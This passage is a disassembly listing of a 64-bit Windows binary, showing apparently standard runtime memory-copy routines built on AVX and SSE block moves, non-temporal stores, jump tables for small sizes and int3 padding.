   14000485b:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   140004862:	0f 83 78 ff ff ff    	jae    0x1400047e0
   140004868:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000486c:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   140004870:	4d 8b d9             	mov    %r9,%r11
   140004873:	49 c1 eb 05          	shr    $0x5,%r11
   140004877:	47 8b 9c 9a d0 c0 01 	mov    0x1c0d0(%r10,%r11,4),%r11d
   14000487e:	00 
   14000487f:	4d 03 da             	add    %r10,%r11
   140004882:	41 ff e3             	jmp    *%r11
   140004885:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   14000488c:	ff ff ff 
   14000488f:	c4 a1 7e 7f 8c 09 00 	vmovdqu %ymm1,-0x100(%rcx,%r9,1)
   140004896:	ff ff ff 
   140004899:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   1400048a0:	ff ff ff 
   1400048a3:	c4 a1 7e 7f 8c 09 20 	vmovdqu %ymm1,-0xe0(%rcx,%r9,1)
   1400048aa:	ff ff ff 
   1400048ad:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   1400048b4:	ff ff ff 
   1400048b7:	c4 a1 7e 7f 8c 09 40 	vmovdqu %ymm1,-0xc0(%rcx,%r9,1)
   1400048be:	ff ff ff 
   1400048c1:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   1400048c8:	ff ff ff 
   1400048cb:	c4 a1 7e 7f 8c 09 60 	vmovdqu %ymm1,-0xa0(%rcx,%r9,1)
   1400048d2:	ff ff ff 
   1400048d5:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   1400048dc:	c4 a1 7e 7f 4c 09 80 	vmovdqu %ymm1,-0x80(%rcx,%r9,1)
   1400048e3:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   1400048ea:	c4 a1 7e 7f 4c 09 a0 	vmovdqu %ymm1,-0x60(%rcx,%r9,1)
   1400048f1:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   1400048f8:	c4 a1 7e 7f 4c 09 c0 	vmovdqu %ymm1,-0x40(%rcx,%r9,1)
   1400048ff:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   140004906:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000490a:	c5 f8 77             	vzeroupper
   14000490d:	c3                   	ret
   14000490e:	66 90                	xchg   %ax,%ax
   140004910:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   140004914:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   140004919:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   14000491e:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   140004923:	c5 fd e7 09          	vmovntdq %ymm1,(%rcx)
   140004927:	c5 fd e7 51 20       	vmovntdq %ymm2,0x20(%rcx)
   14000492c:	c5 fd e7 59 40       	vmovntdq %ymm3,0x40(%rcx)
   140004931:	c5 fd e7 61 60       	vmovntdq %ymm4,0x60(%rcx)
   140004936:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   14000493d:	00 
   14000493e:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   140004945:	00 
   140004946:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   14000494d:	00 
   14000494e:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   140004955:	00 
   140004956:	c5 fd e7 89 80 00 00 	vmovntdq %ymm1,0x80(%rcx)
   14000495d:	00 
   14000495e:	c5 fd e7 91 a0 00 00 	vmovntdq %ymm2,0xa0(%rcx)
   140004965:	00 
   140004966:	c5 fd e7 99 c0 00 00 	vmovntdq %ymm3,0xc0(%rcx)
   14000496d:	00 
   14000496e:	c5 fd e7 a1 e0 00 00 	vmovntdq %ymm4,0xe0(%rcx)
   140004975:	00 
   140004976:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000497d:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   140004984:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000498b:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   140004992:	0f 83 78 ff ff ff    	jae    0x140004910
   140004998:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000499c:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   1400049a0:	4d 8b d9             	mov    %r9,%r11
   1400049a3:	49 c1 eb 05          	shr    $0x5,%r11
   1400049a7:	47 8b 9c 9a f4 c0 01 	mov    0x1c0f4(%r10,%r11,4),%r11d
   1400049ae:	00 
   1400049af:	4d 03 da             	add    %r10,%r11
   1400049b2:	41 ff e3             	jmp    *%r11
   1400049b5:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   1400049bc:	ff ff ff 
   1400049bf:	c4 a1 7d e7 8c 09 00 	vmovntdq %ymm1,-0x100(%rcx,%r9,1)
   1400049c6:	ff ff ff 
   1400049c9:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   1400049d0:	ff ff ff 
   1400049d3:	c4 a1 7d e7 8c 09 20 	vmovntdq %ymm1,-0xe0(%rcx,%r9,1)
   1400049da:	ff ff ff 
   1400049dd:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   1400049e4:	ff ff ff 
   1400049e7:	c4 a1 7d e7 8c 09 40 	vmovntdq %ymm1,-0xc0(%rcx,%r9,1)
   1400049ee:	ff ff ff 
   1400049f1:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   1400049f8:	ff ff ff 
   1400049fb:	c4 a1 7d e7 8c 09 60 	vmovntdq %ymm1,-0xa0(%rcx,%r9,1)
   140004a02:	ff ff ff 
   140004a05:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   140004a0c:	c4 a1 7d e7 4c 09 80 	vmovntdq %ymm1,-0x80(%rcx,%r9,1)
   140004a13:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   140004a1a:	c4 a1 7d e7 4c 09 a0 	vmovntdq %ymm1,-0x60(%rcx,%r9,1)
   140004a21:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   140004a28:	c4 a1 7d e7 4c 09 c0 	vmovntdq %ymm1,-0x40(%rcx,%r9,1)
   140004a2f:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   140004a36:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   140004a3a:	0f ae f8             	sfence
   140004a3d:	c5 f8 77             	vzeroupper
   140004a40:	c3                   	ret
   140004a41:	cc                   	int3
   140004a42:	cc                   	int3
   140004a43:	cc                   	int3
   140004a44:	cc                   	int3
   140004a45:	cc                   	int3
   140004a46:	cc                   	int3
   140004a47:	cc                   	int3
   140004a48:	cc                   	int3
   140004a49:	cc                   	int3
   140004a4a:	cc                   	int3
   140004a4b:	cc                   	int3
   140004a4c:	cc                   	int3
   140004a4d:	cc                   	int3
   140004a4e:	cc                   	int3
   140004a4f:	cc                   	int3
   140004a50:	cc                   	int3
   140004a51:	cc                   	int3
   140004a52:	cc                   	int3
   140004a53:	cc                   	int3
   140004a54:	cc                   	int3
   140004a55:	cc                   	int3
   140004a56:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004a5d:	00 00 00 
   140004a60:	48 8b c1             	mov    %rcx,%rax
   140004a63:	4c 8d 15 96 b5 ff ff 	lea    -0x4a6a(%rip),%r10        # 0x140000000
   140004a6a:	49 83 f8 0f          	cmp    $0xf,%r8
   140004a6e:	0f 87 0c 01 00 00    	ja     0x140004b80
   140004a74:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140004a7b:	00 00 00 00 00 
   140004a80:	47 8b 8c 82 20 c1 01 	mov    0x1c120(%r10,%r8,4),%r9d
   140004a87:	00 
   140004a88:	4d 03 ca             	add    %r10,%r9
   140004a8b:	41 ff e1             	jmp    *%r9
   140004a8e:	c3                   	ret
   140004a8f:	90                   	nop
   140004a90:	4c 8b 02             	mov    (%rdx),%r8
   140004a93:	8b 4a 08             	mov    0x8(%rdx),%ecx
   140004a96:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   140004a9b:	44 0f b6 52 0e       	movzbl 0xe(%rdx),%r10d
   140004aa0:	4c 89 00             	mov    %r8,(%rax)
   140004aa3:	89 48 08             	mov    %ecx,0x8(%rax)
   140004aa6:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   140004aab:	44 88 50 0e          	mov    %r10b,0xe(%rax)
   140004aaf:	c3                   	ret
   140004ab0:	4c 8b 02             	mov    (%rdx),%r8
   140004ab3:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   140004ab7:	44 0f b6 4a 0a       	movzbl 0xa(%rdx),%r9d
   140004abc:	4c 89 00             	mov    %r8,(%rax)
   140004abf:	66 89 48 08          	mov    %cx,0x8(%rax)
   140004ac3:	44 88 48 0a          	mov    %r9b,0xa(%rax)
   140004ac7:	c3                   	ret
   140004ac8:	0f b7 0a             	movzwl (%rdx),%ecx
   140004acb:	66 89 08             	mov    %cx,(%rax)
   140004ace:	c3                   	ret
   140004acf:	90                   	nop
   140004ad0:	8b 0a                	mov    (%rdx),%ecx
   140004ad2:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   140004ad7:	44 0f b6 4a 06       	movzbl 0x6(%rdx),%r9d
   140004adc:	89 08                	mov    %ecx,(%rax)
   140004ade:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   140004ae3:	44 88 48 06          	mov    %r9b,0x6(%rax)
   140004ae7:	c3                   	ret
   140004ae8:	4c 8b 02             	mov    (%rdx),%r8
   140004aeb:	8b 4a 08             	mov    0x8(%rdx),%ecx
   140004aee:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   140004af3:	4c 89 00             	mov    %r8,(%rax)
   140004af6:	89 48 08             	mov    %ecx,0x8(%rax)
   140004af9:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   140004afe:	c3                   	ret
   140004aff:	0f b7 0a             	movzwl (%rdx),%ecx
   140004b02:	44 0f b6 42 02       	movzbl 0x2(%rdx),%r8d
   140004b07:	66 89 08             	mov    %cx,(%rax)
   140004b0a:	44 88 40 02          	mov    %r8b,0x2(%rax)
   140004b0e:	c3                   	ret
   140004b0f:	90                   	nop
   140004b10:	4c 8b 02             	mov    (%rdx),%r8
   140004b13:	8b 4a 08             	mov    0x8(%rdx),%ecx
   140004b16:	44 0f b6 4a 0c       	movzbl 0xc(%rdx),%r9d
   140004b1b:	4c 89 00             	mov    %r8,(%rax)
   140004b1e:	89 48 08             	mov    %ecx,0x8(%rax)
   140004b21:	44 88 48 0c          	mov    %r9b,0xc(%rax)
   140004b25:	c3                   	ret
   140004b26:	4c 8b 02             	mov    (%rdx),%r8
   140004b29:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   140004b2d:	4c 89 00             	mov    %r8,(%rax)
   140004b30:	66 89 48 08          	mov    %cx,0x8(%rax)
   140004b34:	c3                   	ret
   140004b35:	4c 8b 02             	mov    (%rdx),%r8
   140004b38:	0f b6 4a 08          	movzbl 0x8(%rdx),%ecx
   140004b3c:	4c 89 00             	mov    %r8,(%rax)
   140004b3f:	88 48 08             	mov    %cl,0x8(%rax)
   140004b42:	c3                   	ret
   140004b43:	4c 8b 02             	mov    (%rdx),%r8
   140004b46:	8b 4a 08             	mov    0x8(%rdx),%ecx
   140004b49:	4c 89 00             	mov    %r8,(%rax)
   140004b4c:	89 48 08             	mov    %ecx,0x8(%rax)
   140004b4f:	c3                   	ret
   140004b50:	8b 0a                	mov    (%rdx),%ecx
   140004b52:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   140004b57:	89 08                	mov    %ecx,(%rax)
   140004b59:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   140004b5e:	c3                   	ret
   140004b5f:	8b 0a                	mov    (%rdx),%ecx
   140004b61:	44 0f b6 42 04       	movzbl 0x4(%rdx),%r8d
   140004b66:	89 08                	mov    %ecx,(%rax)
   140004b68:	44 88 40 04          	mov    %r8b,0x4(%rax)
   140004b6c:	c3                   	ret
   140004b6d:	48 8b 0a             	mov    (%rdx),%rcx
   140004b70:	48 89 08             	mov    %rcx,(%rax)
   140004b73:	c3                   	ret
   140004b74:	0f b6 0a             	movzbl (%rdx),%ecx
   140004b77:	88 08                	mov    %cl,(%rax)
   140004b79:	c3                   	ret
   140004b7a:	8b 0a                	mov    (%rdx),%ecx
   140004b7c:	89 08                	mov    %ecx,(%rax)
   140004b7e:	c3                   	ret
   140004b7f:	90                   	nop
   140004b80:	49 83 f8 20          	cmp    $0x20,%r8
   140004b84:	77 17                	ja     0x140004b9d
   140004b86:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   140004b8a:	f3 42 0f 6f 54 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm2
   140004b91:	f3 0f 7f 09          	movdqu %xmm1,(%rcx)
   140004b95:	f3 42 0f 7f 54 01 f0 	movdqu %xmm2,-0x10(%rcx,%r8,1)
   140004b9c:	c3                   	ret
   140004b9d:	4e 8d 0c 02          	lea    (%rdx,%r8,1),%r9
   140004ba1:	48 3b ca             	cmp    %rdx,%rcx
   140004ba4:	4c 0f 46 c9          	cmovbe %rcx,%r9
   140004ba8:	49 3b c9             	cmp    %r9,%rcx
   140004bab:	0f 82 2f 04 00 00    	jb     0x140004fe0
   140004bb1:	49 81 f8 00 08 00 00 	cmp    $0x800,%r8
   140004bb8:	0f 83 02 04 00 00    	jae    0x140004fc0
   140004bbe:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   140004bc2:	f3 42 0f 6f 6c 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm5
   140004bc9:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   140004bd0:	0f 86 96 00 00 00    	jbe    0x140004c6c
   140004bd6:	4c 8b c9             	mov    %rcx,%r9
   140004bd9:	49 83 e1 0f          	and    $0xf,%r9
   140004bdd:	49 83 e9 10          	sub    $0x10,%r9
   140004be1:	49 2b c9             	sub    %r9,%rcx
   140004be4:	49 2b d1             	sub    %r9,%rdx
   140004be7:	4d 03 c1             	add    %r9,%r8
   140004bea:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   140004bf1:	76 79                	jbe    0x140004c6c
   140004bf3:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140004bfa:	84 00 00 00 00 00 
   140004c00:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   140004c04:	f3 0f 6f 52 10       	movdqu 0x10(%rdx),%xmm2
   140004c09:	f3 0f 6f 5a 20       	movdqu 0x20(%rdx),%xmm3
   140004c0e:	f3 0f 6f 62 30       	movdqu 0x30(%rdx),%xmm4
   140004c13:	66 0f 7f 09          	movdqa %xmm1,(%rcx)
   140004c17:	66 0f 7f 51 10       	movdqa %xmm2,0x10(%rcx)
   140004c1c:	66 0f 7f 59 20       	movdqa %xmm3,0x20(%rcx)
   140004c21:	66 0f 7f 61 30       	movdqa %xmm4,0x30(%rcx)
   140004c26:	f3 0f 6f 4a 40       	movdqu 0x40(%rdx),%xmm1
   140004c2b:	f3 0f 6f 52 50       	movdqu 0x50(%rdx),%xmm2
   140004c30:	f3 0f 6f 5a 60       	movdqu 0x60(%rdx),%xmm3
   140004c35:	f3 0f 6f 62 70       	movdqu 0x70(%rdx),%xmm4
   140004c3a:	66 0f 7f 49 40       	movdqa %xmm1,0x40(%rcx)
   140004c3f:	66 0f 7f 51 50       	movdqa %xmm2,0x50(%rcx)
   140004c44:	66 0f 7f 59 60       	movdqa %xmm3,0x60(%rcx)
   140004c49:	66 0f 7f 61 70       	movdqa %xmm4,0x70(%rcx)
   140004c4e:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   140004c55:	48 81 c2 80 00 00 00 	add    $0x80,%rdx
   140004c5c:	49 81 e8 80 00 00 00 	sub    $0x80,%r8
   140004c63:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   140004c6a:	73 94                	jae    0x140004c00
   140004c6c:	4d 8d 48 0f          	lea    0xf(%r8),%r9
   140004c70:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   140004c74:	4d 8b d9             	mov    %r9,%r11
   140004c77:	49 c1 eb 04          	shr    $0x4,%r11
   140004c7b:	47 8b 9c 9a 60 c1 01 	mov    0x1c160(%r10,%r11,4),%r11d
   140004c82:	00 
   140004c83:	4d 03 da             	add    %r10,%r11
   140004c86:	41 ff e3             	jmp    *%r11
   140004c89:	f3 42 0f 6f 4c 0a 80 	movdqu -0x80(%rdx,%r9,1),%xmm1
   140004c90:	f3 42 0f 7f 4c 09 80 	movdqu %xmm1,-0x80(%rcx,%r9,1)
   140004c97:	f3 42 0f 6f 4c 0a 90 	movdqu -0x70(%rdx,%r9,1),%xmm1
   140004c9e:	f3 42 0f 7f 4c 09 90 	movdqu %xmm1,-0x70(%rcx,%r9,1)
   140004ca5:	f3 42 0f 6f 4c 0a a0 	movdqu -0x60(%rdx,%r9,1),%xmm1
   140004cac:	f3 42 0f 7f 4c 09 a0 	movdqu %xmm1,-0x60(%rcx,%r9,1)
   140004cb3:	f3 42 0f 6f 4c 0a b0 	movdqu -0x50(%rdx,%r9,1),%xmm1
   140004cba:	f3 42 0f 7f 4c 09 b0 	movdqu %xmm1,-0x50(%rcx,%r9,1)
   140004cc1:	f3 42 0f 6f 4c 0a c0 	movdqu -0x40(%rdx,%r9,1),%xmm1
   140004cc8:	f3 42 0f 7f 4c 09 c0 	movdqu %xmm1,-0x40(%rcx,%r9,1)
   140004ccf:	f3 42 0f 6f 4c 0a d0 	movdqu -0x30(%rdx,%r9,1),%xmm1
   140004cd6:	f3 42 0f 7f 4c 09 d0 	movdqu %xmm1,-0x30(%rcx,%r9,1)
   140004cdd:	f3 42 0f 6f 4c 0a e0 	movdqu -0x20(%rdx,%r9,1),%xmm1
   140004ce4:	f3 42 0f 7f 4c 09 e0 	movdqu %xmm1,-0x20(%rcx,%r9,1)
   140004ceb:	f3 42 0f 7f 6c 01 f0 	movdqu %xmm5,-0x10(%rcx,%r8,1)
   140004cf2:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   140004cf6:	c3                   	ret
   140004cf7:	cc                   	int3
   140004cf8:	cc                   	int3
   140004cf9:	cc                   	int3
   140004cfa:	cc                   	int3
   140004cfb:	cc                   	int3
   140004cfc:	cc                   	int3
   140004cfd:	cc                   	int3
   140004cfe:	cc                   	int3
   140004cff:	cc                   	int3
   140004d00:	cc                   	int3
   140004d01:	cc                   	int3
   140004d02:	cc                   	int3
   140004d03:	cc                   	int3
   140004d04:	cc                   	int3
   140004d05:	cc                   	int3
   140004d06:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004d0d:	00 00 00 
   140004d10:	48 8b c1             	mov    %rcx,%rax
   140004d13:	4c 8d 15 e6 b2 ff ff 	lea    -0x4d1a(%rip),%r10        # 0x140000000
   140004d1a:	49 83 f8 0f          	cmp    $0xf,%r8
   140004d1e:	0f 87 0c 01 00 00    	ja     0x140004e30
   140004d24:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140004d2b:	00 00 00 00 00 
   140004d30:	47 8b 8c 82 90 c1 01 	mov    0x1c190(%r10,%r8,4),%r9d
   140004d37:	00 
   140004d38:	4d 03 ca             	add    %r10,%r9
   140004d3b:	41 ff e1             	jmp    *%r9
   140004d3e:	c3                   	ret
   140004d3f:	90                   	nop
   140004d40:	4c 8b 02             	mov    (%rdx),%r8
   140004d43:	8b 4a 08             	mov    0x8(%rdx),%ecx
   140004d46:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   140004d4b:	44 0f b6 52 0e       	movzbl 0xe(%rdx),%r10d
   140004d50:	4c 89 00             	mov    %r8,(%rax)
   140004d53:	89 48 08             	mov    %ecx,0x8(%rax)
   140004d56:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   140004d5b:	44 88 50 0e          	mov    %r10b,0xe(%rax)
   140004d5f:	c3                   	ret
   140004d60:	4c 8b 02             	mov    (%rdx),%r8
   140004d63:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   140004d67:	44 0f b6 4a 0a       	movzbl 0xa(%rdx),%r9d
   140004d6c:	4c 89 00             	mov    %r8,(%rax)
   140004d6f:	66 89 48 08          	mov    %cx,0x8(%rax)
   140004d73:	44 88 48 0a          	mov    %r9b,0xa(%rax)
   140004d77:	c3                   	ret
   140004d78:	0f b7 0a             	movzwl (%rdx),%ecx
   140004d7b:	66 89 08             	mov    %cx,(%rax)
   140004d7e:	c3                   	ret
   140004d7f:	90                   	nop
   140004d80:	8b 0a                	mov    (%rdx),%ecx
   140004d82:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   140004d87:	44 0f b6 4a 06       	movzbl 0x6(%rdx),%r9d
   140004d8c:	89 08                	mov    %ecx,(%rax)
   140004d8e:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   140004d93:	44 88 48 06          	mov    %r9b,0x6(%rax)
   140004d97:	c3                   	ret
   140004d98:	4c 8b 02             	mov    (%rdx),%r8
   140004d9b:	8b 4a 08             	mov    0x8(%rdx),%ecx
   140004d9e:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   140004da3:	4c 89 00             	mov    %r8,(%rax)
   140004da6:	89 48 08             	mov    %ecx,0x8(%rax)
   140004da9:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   140004dae:	c3                   	ret
   140004daf:	0f b7 0a             	movzwl (%rdx),%ecx
   140004db2:	44 0f b6 42 02       	movzbl 0x2(%rdx),%r8d
   140004db7:	66 89 08             	mov    %cx,(%rax)
   140004dba:	44 88 40 02          	mov    %r8b,0x2(%rax)
   140004dbe:	c3                   	ret
   140004dbf:	90                   	nop
   140004dc0:	4c 8b 02             	mov    (%rdx),%r8
   140004dc3:	8b 4a 08             	mov    0x8(%rdx),%ecx
   140004dc6:	44 0f b6 4a 0c       	movzbl 0xc(%rdx),%r9d
   140004dcb:	4c 89 00             	mov    %r8,(%rax)
   140004dce:	89 48 08             	mov    %ecx,0x8(%rax)
   140004dd1:	44 88 48 0c          	mov    %r9b,0xc(%rax)
   140004dd5:	c3                   	ret
   140004dd6:	4c 8b 02             	mov    (%rdx),%r8
   140004dd9:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   140004ddd:	4c 89 00             	mov    %r8,(%rax)
   140004de0:	66 89 48 08          	mov    %cx,0x8(%rax)
   140004de4:	c3                   	ret
   140004de5:	4c 8b 02             	mov    (%rdx),%r8
   140004de8:	0f b6 4a 08          	movzbl 0x8(%rdx),%ecx
   140004dec:	4c 89 00             	mov    %r8,(%rax)
   140004def:	88 48 08             	mov    %cl,0x8(%rax)
   140004df2:	c3                   	ret
   140004df3:	4c 8b 02             	mov    (%rdx),%r8
   140004df6:	8b 4a 08             	mov    0x8(%rdx),%ecx
   140004df9:	4c 89 00             	mov    %r8,(%rax)
   140004dfc:	89 48 08             	mov    %ecx,0x8(%rax)
   140004dff:	c3                   	ret
   140004e00:	8b 0a                	mov    (%rdx),%ecx
   140004e02:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   140004e07:	89 08                	mov    %ecx,(%rax)
   140004e09:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   140004e0e:	c3                   	ret
   140004e0f:	8b 0a                	mov    (%rdx),%ecx
   140004e11:	44 0f b6 42 04       	movzbl 0x4(%rdx),%r8d
   140004e16:	89 08                	mov    %ecx,(%rax)
   140004e18:	44 88 40 04          	mov    %r8b,0x4(%rax)
   140004e1c:	c3                   	ret
   140004e1d:	48 8b 0a             	mov    (%rdx),%rcx
   140004e20:	48 89 08             	mov    %rcx,(%rax)
   140004e23:	c3                   	ret
   140004e24:	0f b6 0a             	movzbl (%rdx),%ecx
   140004e27:	88 08                	mov    %cl,(%rax)
   140004e29:	c3                   	ret
   140004e2a:	8b 0a                	mov    (%rdx),%ecx
   140004e2c:	89 08                	mov    %ecx,(%rax)
   140004e2e:	c3                   	ret
   140004e2f:	90                   	nop
   140004e30:	49 83 f8 20          	cmp    $0x20,%r8
   140004e34:	77 17                	ja     0x140004e4d
   140004e36:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   140004e3a:	f3 42 0f 6f 54 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm2
   140004e41:	f3 0f 7f 09          	movdqu %xmm1,(%rcx)
   140004e45:	f3 42 0f 7f 54 01 f0 	movdqu %xmm2,-0x10(%rcx,%r8,1)
   140004e4c:	c3                   	ret
   140004e4d:	4e 8d 0c 02          	lea    (%rdx,%r8,1),%r9
   140004e51:	48 3b ca             	cmp    %rdx,%rcx
   140004e54:	4c 0f 46 c9          	cmovbe %rcx,%r9
   140004e58:	49 3b c9             	cmp    %r9,%rcx
   140004e5b:	0f 82 8f 02 00 00    	jb     0x1400050f0
   140004e61:	49 81 f8 00 08 00 00 	cmp    $0x800,%r8
   140004e68:	0f 83 62 02 00 00    	jae    0x1400050d0
   140004e6e:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   140004e72:	f3 42 0f 6f 6c 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm5
   140004e79:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   140004e80:	0f 86 96 00 00 00    	jbe    0x140004f1c
   140004e86:	4c 8b c9             	mov    %rcx,%r9
   140004e89:	49 83 e1 0f          	and    $0xf,%r9
   140004e8d:	49 83 e9 10          	sub    $0x10,%r9
   140004e91:	49 2b c9             	sub    %r9,%rcx
   140004e94:	49 2b d1             	sub    %r9,%rdx
   140004e97:	4d 03 c1             	add    %r9,%r8
   140004e9a:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   140004ea1:	76 79                	jbe    0x140004f1c
   140004ea3:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140004eaa:	84 00 00 00 00 00 
   140004eb0:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   140004eb4:	f3 0f 6f 52 10       	movdqu 0x10(%rdx),%xmm2
   140004eb9:	f3 0f 6f 5a 20       	movdqu 0x20(%rdx),%xmm3
   140004ebe:	f3 0f 6f 62 30       	movdqu 0x30(%rdx),%xmm4
   140004ec3:	66 0f 7f 09          	movdqa %xmm1,(%rcx)
   140004ec7:	66 0f 7f 51 10       	movdqa %xmm2,0x10(%rcx)
   140004ecc:	66 0f 7f 59 20       	movdqa %xmm3,0x20(%rcx)
   140004ed1:	66 0f 7f 61 30       	movdqa %xmm4,0x30(%rcx)
   140004ed6:	f3 0f 6f 4a 40       	movdqu 0x40(%rdx),%xmm1
   140004edb:	f3 0f 6f 52 50       	movdqu 0x50(%rdx),%xmm2
   140004ee0:	f3 0f 6f 5a 60       	movdqu 0x60(%rdx),%xmm3
   140004ee5:	f3 0f 6f 62 70       	movdqu 0x70(%rdx),%xmm4
   140004eea:	66 0f 7f 49 40       	movdqa %xmm1,0x40(%rcx)
   140004eef:	66 0f 7f 51 50       	movdqa %xmm2,0x50(%rcx)
   140004ef4:	66 0f 7f 59 60       	movdqa %xmm3,0x60(%rcx)
   140004ef9:	66 0f 7f 61 70       	movdqa %xmm4,0x70(%rcx)
   140004efe:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   140004f05:	48 81 c2 80 00 00 00 	add    $0x80,%rdx
   140004f0c:	49 81 e8 80 00 00 00 	sub    $0x80,%r8
   140004f13:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   140004f1a:	73 94                	jae    0x140004eb0
   140004f1c:	4d 8d 48 0f          	lea    0xf(%r8),%r9
   140004f20:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   140004f24:	4d 8b d9             	mov    %r9,%r11
   140004f27:	49 c1 eb 04          	shr    $0x4,%r11
   140004f2b:	47 8b 9c 9a d0 c1 01 	mov    0x1c1d0(%r10,%r11,4),%r11d
   140004f32:	00 
   140004f33:	4d 03 da             	add    %r10,%r11
   140004f36:	41 ff e3             	jmp    *%r11
   140004f39:	f3 42 0f 6f 4c 0a 80 	movdqu -0x80(%rdx,%r9,1),%xmm1
   140004f40:	f3 42 0f 7f 4c 09 80 	movdqu %xmm1,-0x80(%rcx,%r9,1)
   140004f47:	f3 42 0f 6f 4c 0a 90 	movdqu -0x70(%rdx,%r9,1),%xmm1
   140004f4e:	f3 42 0f 7f 4c 09 90 	movdqu %xmm1,-0x70(%rcx,%r9,1)
   140004f55:	f3 42 0f 6f 4c 0a a0 	movdqu -0x60(%rdx,%r9,1),%xmm1
   140004f5c:	f3 42 0f 7f 4c 09 a0 	movdqu %xmm1,-0x60(%rcx,%r9,1)
   140004f63:	f3 42 0f 6f 4c 0a b0 	movdqu -0x50(%rdx,%r9,1),%xmm1
